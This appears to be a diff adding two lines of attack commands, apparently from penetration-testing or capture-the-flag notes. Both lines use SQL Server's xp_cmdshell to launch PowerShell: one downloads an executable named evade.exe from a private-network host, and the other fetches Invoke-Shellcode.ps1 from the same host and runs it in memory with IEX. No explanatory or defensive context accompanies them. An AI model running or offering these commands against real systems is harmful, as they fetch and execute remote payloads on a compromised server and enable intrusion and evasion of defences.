@@ -1,0 +1,2 @@
+xp_cmdshell powershell.exe wget http://10.10.14.159/evade.exe
+xp_cmdshell powershell -c IEX(New-Object System.Net.WebClient).DownloadString("http://10.10.14.159:8000/Invoke-Shellcode.ps1")
